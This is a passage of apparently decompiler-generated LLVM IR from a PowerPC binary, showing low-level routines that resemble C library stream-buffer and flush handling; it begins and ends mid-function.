  uselistorder i32 %v0_10006190, { 1, 0 }
  uselistorder i32 %v2_10006184.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10006164, { 1, 0 }
  uselistorder i32 %v1_1000614c, { 1, 2, 0 }
  uselistorder i32 %v0_10006140, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @function_1000608c, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000e078.233 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100065d0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100065c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000658c, { 1, 0 }
  uselistorder label %dec_label_pc_1000655c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100064e8, { 1, 0 }
  uselistorder label %dec_label_pc_100064d4, { 1, 0 }
  uselistorder label %dec_label_pc_10006498, { 1, 0 }
  uselistorder label %dec_label_pc_100063e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000638c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000633c, { 1, 0 }
  uselistorder label %dec_label_pc_10006310, { 1, 0 }
  uselistorder label %dec_label_pc_100062c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100062c0, { 1, 0 }
  uselistorder label %dec_label_pc_10006234, { 1, 0 }
  uselistorder label %dec_label_pc_1000622c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100061cc, { 1, 0 }
  uselistorder label %dec_label_pc_100061c8, { 1, 0 }
  uselistorder label %dec_label_pc_100061b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006194, { 1, 0 }
  uselistorder label %dec_label_pc_10006190, { 1, 0 }
  uselistorder label %dec_label_pc_10006174, { 1, 0 }
}

define i32 @function_100065e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100065e4:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100065ec = call i32 @__asm_mfcr()
  store i32 %v0_100065ec, i32* %r31.global-to-local, align 4
  %v2_10006610 = add i32 %v0_100065ec, 52
  %v3_10006610 = inttoptr i32 %v2_10006610 to i32*
  %v4_10006610 = load i32, i32* %v3_10006610, align 4
  %v2_10006614 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006614, i32* @r3, align 4
  %v3_10006618 = icmp eq i32 %v4_10006610, 0
  store i1 %v3_10006618, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10006618, label %dec_label_pc_1000662c, label %dec_label_pc_1000662c.thread

dec_label_pc_1000662c.thread:                     ; preds = %dec_label_pc_100065e4
  %v1_100066343 = inttoptr i32 %v0_100065ec to i16*
  %v2_100066344 = load i16, i16* %v1_100066343, align 2
  %v3_100066345 = zext i16 %v2_100066344 to i32
  store i32 %v3_100066345, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006640

dec_label_pc_1000662c:                            ; preds = %dec_label_pc_100065e4
  %v0_10006620 = call i32 @function_10008c84()
  %v0_10006628 = call i32 @function_10008c7c()
  %v0_10006634.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006638.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_10006614, i32* @r3, align 4
  %v1_10006634 = inttoptr i32 %v0_10006634.pre to i16*
  %v2_10006634 = load i16, i16* %v1_10006634, align 2
  %v3_10006634 = zext i16 %v2_10006634 to i32
  store i32 %v3_10006634, i32* %r31.global-to-local, align 4
  br i1 %v0_10006638.pre, label %dec_label_pc_1000663c, label %dec_label_pc_10006640

dec_label_pc_1000663c:                            ; preds = %dec_label_pc_1000662c
  %v0_1000663c = call i32 @function_10008c84()
  br label %dec_label_pc_10006640

dec_label_pc_10006640:                            ; preds = %dec_label_pc_1000662c.thread, %dec_label_pc_1000662c, %dec_label_pc_1000663c
  %v3_100066346 = phi i32 [ %v3_100066345, %dec_label_pc_1000662c.thread ], [ %v3_10006634, %dec_label_pc_1000662c ], [ %v3_10006634, %dec_label_pc_1000663c ]
  %v1_10006644 = call i32 @__asm_rlwinm(i32 %v3_100066346, i32 0, i32 29, i32 29)
  %v1_10006654 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100065ec)
  ret i32 %v1_10006644

; uselistorder directives
  uselistorder i32 %v0_100065ec, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10006640, { 2, 1, 0 }
}

define i32 @function_10006660(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006660:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006668 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10006668, i32* %r28.global-to-local, align 4
  %v1_1000668c = add i32 %arg3, 52
  %v2_1000668c = inttoptr i32 %v1_1000668c to i32*
  %v3_1000668c = load i32, i32* %v2_1000668c, align 4
  %v2_10006690 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006690, i32* @r3, align 4
  %v3_1000669c = icmp eq i32 %v3_1000668c, 0
  store i1 %v3_1000669c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000669c, label %dec_label_pc_100066a4, label %dec_label_pc_100066b0

dec_label_pc_100066a4:                            ; preds = %dec_label_pc_10006660
  %v0_100066a4 = call i32 @function_10008c84()
  %v0_100066ac = call i32 @function_10008c7c()
  %v0_100066b0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100066b4.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100066b8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100066b0

dec_label_pc_100066b0:                            ; preds = %dec_label_pc_10006660, %dec_label_pc_100066a4
  %v0_100066b8 = phi i32 [ %v0_10006668, %dec_label_pc_10006660 ], [ %v0_100066b8.pre, %dec_label_pc_100066a4 ]
  %v0_100066b4 = phi i32 [ %arg3, %dec_label_pc_10006660 ], [ %v0_100066b4.pre, %dec_label_pc_100066a4 ]
  %v0_100066b0 = phi i32 [ %arg2, %dec_label_pc_10006660 ], [ %v0_100066b0.pre, %dec_label_pc_100066a4 ]
  store i32 268461760, i32* @lr, align 4
  %v3_100066bc = inttoptr i32 %v0_100066b8 to i8*
  %v4_100066bc = call i32 @function_10006a90(i8* %v3_100066bc, i32 %v0_100066b0, i32 %v0_100066b4)
  store i32 %v4_100066bc, i32* @r31, align 4
  store i32 %v2_10006690, i32* @r3, align 4
  %v0_100066cc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100066cc, label %dec_label_pc_100066d0, label %dec_label_pc_100066d4

dec_label_pc_100066d0:                            ; preds = %dec_label_pc_100066b0
  %v0_100066d0 = call i32 @function_10008c84()
  %v0_100066d8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100066d4

dec_label_pc_100066d4:                            ; preds = %dec_label_pc_100066b0, %dec_label_pc_100066d0
  %v0_100066d8 = phi i32 [ %v4_100066bc, %dec_label_pc_100066b0 ], [ %v0_100066d8.pre, %dec_label_pc_100066d0 ]
  %v1_100066e8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006668)
  %v9_100066e8 = extractvalue %0 %v1_100066e8, 7
  store i4 %v9_100066e8, i4* @cr4, align 1
  ret i32 %v0_100066d8

; uselistorder directives
  uselistorder i32 %v0_10006668, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100066d4, { 1, 0 }
  uselistorder label %dec_label_pc_100066b0, { 1, 0 }
}

define i32 @function_100066f4(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100066f4:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_10006700 = add i32 %arg2, 56
  store i32 %v1_10006700, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v1_10006714 = add i32 %arg2, 52
  %v2_10006714 = inttoptr i32 %v1_10006714 to i32*
  %v3_10006714 = load i32, i32* %v2_10006714, align 4
  %v3_10006718 = icmp eq i32 %v3_10006714, 0
  br i1 %v3_10006718, label %dec_label_pc_10006750, label %dec_label_pc_10006720

dec_label_pc_10006720:                            ; preds = %dec_label_pc_100066f4
  %v1_10006720 = add i32 %arg2, 16
  %v2_10006720 = inttoptr i32 %v1_10006720 to i32*
  %v3_10006720 = load i32, i32* %v2_10006720, align 4
  %v1_100067241 = zext i8 %arg1 to i32
  store i32 %v1_100067241, i32* %r30.global-to-local, align 4
  %v1_10006728 = add i32 %arg2, 28
  %v2_10006728 = inttoptr i32 %v1_10006728 to i32*
  %v3_10006728 = load i32, i32* %v2_10006728, align 4
  %v2_1000672c = add i32 %v3_10006720, 1
  store i32 %v2_1000672c, i32* %r11.global-to-local, align 4
  %v3_10006730 = icmp ult i32 %v3_10006720, %v3_10006728
  br i1 %v3_10006730, label %dec_label_pc_10006738, label %dec_label_pc_10006744

dec_label_pc_10006738:                            ; preds = %dec_label_pc_10006720
  %v4_10006720 = inttoptr i32 %v3_10006720 to i8*
  store i8 %arg1, i8* %v4_10006720, align 1
  %v0_1000673c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000673c, i32* %v2_10006720, align 4
  br label %dec_label_pc_100067a8

dec_label_pc_10006744:                            ; preds = %dec_label_pc_10006720
  store i32 268461896, i32* @lr, align 4
  %v4_10006744 = trunc i32 %v1_10006700 to i8
  %v5_10006744 = call i32 @function_10006b54(i8 %v4_10006744, i32 %v3_10006720, i32 %v1_10006700)
  store i32 %v5_10006744, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100067a8

dec_label_pc_10006750:                            ; preds = %dec_label_pc_100066f4
  %v2_10006754 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006754, i32* @r3, align 4
  %v0_1000675c = call i32 @function_10008c84()
  %v0_10006764 = call i32 @function_10008c7c()
  %v0_10006768 = load i32, i32* @r31, align 4
  %v1_10006768 = add i32 %v0_10006768, 16
  %v2_10006768 = inttoptr i32 %v1_10006768 to i32*
  %v3_10006768 = load i32, i32* %v2_10006768, align 4
  %v1_1000676c = add i32 %v0_10006768, 28
  %v2_1000676c = inttoptr i32 %v1_1000676c to i32*
  %v3_1000676c = load i32, i32* %v2_1000676c, align 4
  %v2_10006774 = add i32 %v3_10006768, 1
  store i32 %v2_10006774, i32* %r11.global-to-local, align 4
  %v0_10006778 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006778 = urem i32 %v0_10006778, 256
  store i32 %v1_10006778, i32* %r30.global-to-local, align 4
  %v3_1000677c = icmp ult i32 %v3_10006768, %v3_1000676c
  br i1 %v3_1000677c, label %dec_label_pc_10006788, label %dec_label_pc_10006794

dec_label_pc_10006788:                            ; preds = %dec_label_pc_10006750
  %v4_10006768 = inttoptr i32 %v3_10006768 to i8*
  %v1_10006788 = trunc i32 %v0_10006778 to i8
  store i8 %v1_10006788, i8* %v4_10006768, align 1
  %v0_1000678c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000678c = load i32, i32* @r31, align 4
  %v2_1000678c = add i32 %v1_1000678c, 16
  %v3_1000678c = inttoptr i32 %v2_1000678c to i32*
  store i32 %v0_1000678c, i32* %v3_1000678c, align 4
  br label %dec_label_pc_1000679c

dec_label_pc_10006794:                            ; preds = %dec_label_pc_10006750
  %v1_10006780 = trunc i32 %v0_10006778 to i8
  store i32 268461976, i32* @lr, align 4
  %v6_10006794 = call i32 @function_10006b54(i8 %v1_10006780, i32 %v0_10006768, i32 %v3_10006768)
  store i32 %v6_10006794, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000679c

dec_label_pc_1000679c:                            ; preds = %dec_label_pc_10006788, %dec_label_pc_10006794
  store i32 %v2_10006754, i32* @r3, align 4
  %v0_100067a4 = call i32 @function_10008c84()
  br label %dec_label_pc_100067a8

dec_label_pc_100067a8:                            ; preds = %dec_label_pc_10006744, %dec_label_pc_10006738, %dec_label_pc_1000679c
  %v0_100067ac = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_100067ac

; uselistorder directives
  uselistorder i32 %v0_10006778, { 2, 1, 0 }
  uselistorder i32 %v3_10006768, { 0, 3, 1, 2 }
  uselistorder i32 %v0_10006768, { 1, 0, 2 }
  uselistorder i32 %v3_10006720, { 0, 3, 1, 2 }
  uselistorder i32 %v1_10006700, { 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i8, i32, i32)* @function_10006b54, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_100067a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000679c, { 1, 0 }
}

define i32 @function_100067c0() local_unnamed_addr {
dec_label_pc_100067c0:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008c7c.194 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r29, align 4
  %v2_100067e4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100067e4, i32* @r3, align 4
  %v0_100067ec = call i32 @function_10008c84()
  %v0_100067f4 = call i32 @function_10008c7c()
  %v3_100067fc = load i32, i32* @global_var_10010494.196, align 4
  %v3_10006800 = icmp eq i32 %v3_100067fc, 1
  br i1 %v3_10006800, label %dec_label_pc_10006808, label %dec_label_pc_100068b0

dec_label_pc_10006808:                            ; preds = %dec_label_pc_100067c0
  %v3_1000680c = load i32, i32* @global_var_10010498.197, align 4
  %tmp7 = icmp slt i32 %v3_1000680c, 1
  br i1 %tmp7, label %dec_label_pc_100068b0, label %dec_label_pc_10006818

dec_label_pc_10006818:                            ; preds = %dec_label_pc_10006808
  %v2_10006824 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006824, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10006830 = call i32 @function_10008c84()
  %v0_10006838 = call i32 @function_10008c7c()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000689011 = icmp eq i32 %storemerge8, 0
  %v0_1000689412 = load i32, i32* @r30, align 4
  br i1 %v3_1000689011, label %dec_label_pc_1000689c, label %dec_label_pc_10006848

dec_label_pc_10006848:                            ; preds = %dec_label_pc_10006818, %dec_label_pc_10006890.backedge
  %v0_1000689417 = phi i32 [ %v0_10006894, %dec_label_pc_10006890.backedge ], [ %v0_1000689412, %dec_label_pc_10006818 ]
  %v3_1000689418.in = phi i32 [ %v0_10006894, %dec_label_pc_10006890.backedge ], [ %v0_1000689412, %dec_label_pc_10006818 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10006890.backedge ], [ %storemerge8, %dec_label_pc_10006818 ]
  %v1_10006848 = inttoptr i32 %storemerge16 to i16*
  %v2_10006848 = load i16, i16* %v1_10006848, align 2
  %v1_1000684c = add i32 %storemerge16, 32
  %v2_1000684c = inttoptr i32 %v1_1000684c to i32*
  %v3_1000684c = load i32, i32* %v2_1000684c, align 4
  store i32 %v3_1000684c, i32* @r31, align 4
  %v1_10006850 = and i16 %v2_10006848, -32720
  %v3_10006854 = icmp eq i16 %v1_10006850, 48
  br i1 %v3_10006854, label %dec_label_pc_10006864, label %dec_label_pc_1000685c

dec_label_pc_1000685c:                            ; preds = %dec_label_pc_10006848
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10006890.backedge

dec_label_pc_10006864:                            ; preds = %dec_label_pc_10006848
  %v3_1000689418 = icmp eq i32 %v3_1000689418.in, 0
  br i1 %v3_1000689418, label %dec_label_pc_10006868, label %dec_label_pc_10006874

dec_label_pc_10006868:                            ; preds = %dec_label_pc_10006864
  store i32 %v3_1000684c, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  br label %dec_label_pc_10006878

dec_label_pc_10006874:                            ; preds = %dec_label_pc_10006864
  %v2_10006874 = add i32 %v0_1000689417, 32
  %v3_10006874 = inttoptr i32 %v2_10006874 to i32*
  store i32 %v3_1000684c, i32* %v3_10006874, align 4
  %v0_10006878.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10006878

dec_label_pc_10006878:                            ; preds = %dec_label_pc_10006868, %dec_label_pc_10006874
  %v0_10006878 = phi i32 [ %storemerge16, %dec_label_pc_10006868 ], [ %v0_10006878.pre, %dec_label_pc_10006874 ]
  %v1_10006878 = inttoptr i32 %v0_10006878 to i16*
  %v2_10006878 = load i16, i16* %v1_10006878, align 2
  %v1_10006880 = and i16 %v2_10006878, 8192
  %v3_10006880 = icmp eq i16 %v1_10006880, 0
  br i1 %v3_10006880, label %dec_label_pc_10006890.backedge, label %dec_label_pc_10006888

dec_label_pc_10006890.backedge:                   ; preds = %dec_label_pc_10006878, %dec_label_pc_1000685c, %dec_label_pc_10006888
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10006890 = icmp eq i32 %storemerge, 0
  %v0_10006894 = load i32, i32* @r30, align 4
  br i1 %v3_10006890, label %dec_label_pc_1000689c, label %dec_label_pc_10006848

dec_label_pc_10006888:                            ; preds = %dec_label_pc_10006878
  store i32 268462220, i32* @lr, align 4
  %v2_10006888 = call i32 @function_10007e48(i32 %v0_10006878)
  br label %dec_label_pc_10006890.backedge

dec_label_pc_1000689c:                            ; preds = %dec_label_pc_10006890.backedge, %dec_label_pc_10006818
  store i32 %v2_10006824, i32* @r3, align 4
  %v0_100068a4 = call i32 @function_10008c84()
  %v0_100068ac = load i32, i32* @r29, align 4
  store i32 %v0_100068ac, i32* @global_var_10010498.197, align 4
  %v3_100068b8.pre = load i32, i32* @global_var_10010494.196, align 4
  br label %dec_label_pc_100068b0

dec_label_pc_100068b0:                            ; preds = %dec_label_pc_100067c0, %dec_label_pc_10006808, %dec_label_pc_1000689c
  %v3_100068b8 = phi i32 [ %v3_100067fc, %dec_label_pc_100067c0 ], [ 1, %dec_label_pc_10006808 ], [ %v3_100068b8.pre, %dec_label_pc_1000689c ]
  store i32 %v2_100067e4, i32* @r3, align 4
  %v1_100068c0 = add i32 %v3_100068b8, -1
  store i32 %v1_100068c0, i32* @global_var_10010494.196, align 4
  %v0_100068c8 = call i32 @function_10008c84()
  ret i32 %v0_100068c8

; uselistorder directives
  uselistorder i32 %v0_10006894, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10006878, { 1, 0 }
  uselistorder i32 %v3_1000684c, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100068b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006890.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006878, { 1, 0 }
  uselistorder label %dec_label_pc_10006848, { 1, 0 }
}

define i32 @function_100068e0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100068e0:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10010438.216 to i32), i32* %r9.global-to-local, align 4
  %v5_100068f0 = icmp eq i16* %arg1, bitcast (i32** @global_var_10010438.216 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_100068f0, label %dec_label_pc_10006914, label %dec_label_pc_10006908

dec_label_pc_10006908:                            ; preds = %dec_label_pc_100068e0
  %v4_10006908 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10006908, label %dec_label_pc_10006914, label %dec_label_pc_10006a40

dec_label_pc_10006914:                            ; preds = %dec_label_pc_10006908, %dec_label_pc_100068e0
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008c7c.194 to i32), i32* @r30, align 4
  %v2_10006920 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_10006934 = call i32 @function_10008c84()
  %v0_1000693c = call i32 @function_10008c7c()
  %v3_10006944 = load i32, i32* @global_var_10010494.196, align 4
  store i32 %v2_10006920, i32* @r3, align 4
  %v1_10006954 = add i32 %v3_10006944, 1
  store i32 %v1_10006954, i32* %r9.global-to-local, align 4
  store i32 %v1_10006954, i32* @global_var_10010494.196, align 4
  %v0_10006960 = call i32 @function_10008c84()
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_10006970 = call i32 @function_10008c84()
  %v0_10006978 = call i32 @function_10008c7c()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_10006920, i32* @r3, align 4
  %v3_10006984 = load i32, i32* bitcast (i32** @global_var_10010438.216 to i32*), align 4
  store i32 %v3_10006984, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10006990 = call i32 @function_10008c84()
  %v0_10006a30.pr = load i32, i32* @r31, align 4
  %v3_10006a303 = icmp eq i32 %v0_10006a30.pr, 0
  br i1 %v3_10006a303, label %dec_label_pc_10006a38, label %dec_label_pc_10006998

dec_label_pc_10006998:                            ; preds = %dec_label_pc_10006914, %dec_label_pc_10006a2c
  %v0_100069b4 = phi i32 [ %v3_10006a2c, %dec_label_pc_10006a2c ], [ %v0_10006a30.pr, %dec_label_pc_10006914 ]
  %v1_10006998 = inttoptr i32 %v0_100069b4 to i16*
  %v2_10006998 = load i16, i16* %v1_10006998, align 2
  %v3_10006998 = zext i16 %v2_10006998 to i32
  %v1_1000699c = and i32 %v3_10006998, 64
  store i32 %v1_1000699c, i32* %r9.global-to-local, align 4
  %v3_1000699c = icmp eq i32 %v1_1000699c, 0
  br i1 %v3_1000699c, label %dec_label_pc_10006a2c, label %dec_label_pc_100069a4

dec_label_pc_100069a4:                            ; preds = %dec_label_pc_10006998
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100069a8 = load i32, i32* @global_var_1001043c.214, align 4
  %v3_100069ac = icmp eq i32 %v3_100069a8, 2
  br i1 %v3_100069ac, label %dec_label_pc_100069d0, label %dec_label_pc_100069b4

dec_label_pc_100069b4:                            ; preds = %dec_label_pc_100069a4
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_100069c4 = call i32 @function_10008c84()
  %v0_100069cc = call i32 @function_10008c7c()
  %v0_100069d0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100069d0

dec_label_pc_100069d0:                            ; preds = %dec_label_pc_100069a4, %dec_label_pc_100069b4
  %v0_100069e4 = phi i32 [ %v0_100069b4, %dec_label_pc_100069a4 ], [ %v0_100069d0.pre, %dec_label_pc_100069b4 ]
  %v1_100069d0 = inttoptr i32 %v0_100069e4 to i16*
  %v2_100069d0 = load i16, i16* %v1_100069d0, align 2
  %v3_100069d0 = zext i16 %v2_100069d0 to i32
  %v0_100069d4 = load i32, i32* @r27, align 4
  %v2_100069d4 = or i32 %v0_100069d4, %v3_100069d0
  %v1_100069d8 = and i32 %v2_100069d4, 832
  %v1_100069dc = xor i32 %v1_100069d8, 320
  store i32 %v1_100069dc, i32* %r9.global-to-local, align 4
  %v3_100069dc = icmp eq i32 %v1_100069dc, 0
  br i1 %v3_100069dc, label %dec_label_pc_100069e4, label %dec_label_pc_10006a10

dec_label_pc_100069e4:                            ; preds = %dec_label_pc_100069d0
  store i32 %v0_100069e4, i32* @r3, align 4
  store i32 268462572, i32* @lr, align 4
  %v0_100069e8 = call i32 @function_10005544()
  %v3_100069ec = icmp eq i32 %v0_100069e8, 0
  br i1 %v3_100069ec, label %dec_label_pc_100069fc, label %dec_label_pc_100069f4

dec_label_pc_100069f4:                            ; preds = %dec_label_pc_100069e4
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10006a10

dec_label_pc_100069fc:                            ; preds = %dec_label_pc_100069e4
  %v0_100069fc = load i32, i32* @r31, align 4
  %v1_100069fc = inttoptr i32 %v0_100069fc to i16*
  %v2_100069fc = load i16, i16* %v1_100069fc, align 2
  %v3_100069fc = zext i16 %v2_100069fc to i32
  %v1_10006a00 = add i32 %v0_100069fc, 8
  %v2_10006a00 = inttoptr i32 %v1_10006a00 to i32*
  %v3_10006a00 = load i32, i32* %v2_10006a00, align 4
  store i32 %v3_10006a00, i32* %r9.global-to-local, align 4
  %v1_10006a04 = call i32 @__asm_rlwinm(i32 %v3_100069fc, i32 0, i32 26, i32 24)
  %v2_10006a04 = trunc i32 %v1_10006a04 to i16
  %v1_10006a08 = load i32, i32* @r31, align 4
  %v2_10006a08 = add i32 %v1_10006a08, 28
  %v3_10006a08 = inttoptr i32 %v2_10006a08 to i32*
  store i32 %v3_10006a00, i32* %v3_10006a08, align 4
  %v3_10006a0c = load i32, i32* @r31, align 4
  %v4_10006a0c = inttoptr i32 %v3_10006a0c to i16*
  store i16 %v2_10006a04, i16* %v4_10006a0c, align 2
  br label %dec_label_pc_10006a10

dec_label_pc_10006a10:                            ; preds = %dec_label_pc_100069d0, %dec_label_pc_100069f4, %dec_label_pc_100069fc
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006a14 = load i32, i32* @global_var_1001043c.214, align 4
  %v3_10006a18 = icmp eq i32 %v3_10006a14, 2
  br i1 %v3_10006a18, label %dec_label_pc_10006a2c, label %dec_label_pc_10006a20

dec_label_pc_10006a20:                            ; preds = %dec_label_pc_10006a10
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_10006a28 = call i32 @function_10008c84()
  br label %dec_label_pc_10006a2c

dec_label_pc_10006a2c:                            ; preds = %dec_label_pc_10006a10, %dec_label_pc_10006998, %dec_label_pc_10006a20
  %v0_10006a2c = load i32, i32* @r31, align 4
  %v1_10006a2c = add i32 %v0_10006a2c, 32
  %v2_10006a2c = inttoptr i32 %v1_10006a2c to i32*
  %v3_10006a2c = load i32, i32* %v2_10006a2c, align 4
  store i32 %v3_10006a2c, i32* @r31, align 4
  %v3_10006a30 = icmp eq i32 %v3_10006a2c, 0
  br i1 %v3_10006a30, label %dec_label_pc_10006a38, label %dec_label_pc_10006998

dec_label_pc_10006a38:                            ; preds = %dec_label_pc_10006a2c, %dec_label_pc_10006914
  store i32 ptrtoint (i32* @global_var_10006a3c.241 to i32), i32* @lr, align 4
  %v0_10006a38 = call i32 @function_100067c0()
  br label %dec_label_pc_10006a78

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_10006908
  %v3_10006a40 = load i16, i16* %arg1, align 2
  %v4_10006a40 = zext i16 %v3_10006a40 to i32
  store i32 0, i32* @r28, align 4
  %v1_10006a48 = and i32 %v4_10006a40, 64
  store i32 %v1_10006a48, i32* %r9.global-to-local, align 4
  %v3_10006a48 = icmp eq i32 %v1_10006a48, 0
  br i1 %v3_10006a48, label %dec_label_pc_10006a78, label %dec_label_pc_10006a50

dec_label_pc_10006a50:                            ; preds = %dec_label_pc_10006a40
  store i32 268462676, i32* @lr, align 4
  %v0_10006a50 = call i32 @function_10005544()
  store i32 -1, i32* @r28, align 4
  %v3_10006a58 = icmp eq i32 %v0_10006a50, 0
  br i1 %v3_10006a58, label %dec_label_pc_10006a60, label %dec_label_pc_10006a78

dec_label_pc_10006a60:                            ; preds = %dec_label_pc_10006a50
  %v0_10006a60 = load i32, i32* @r29, align 4
  %v1_10006a60 = inttoptr i32 %v0_10006a60 to i16*
  %v2_10006a60 = load i16, i16* %v1_10006a60, align 2
  %v3_10006a60 = zext i16 %v2_10006a60 to i32
  store i32 0, i32* @r28, align 4
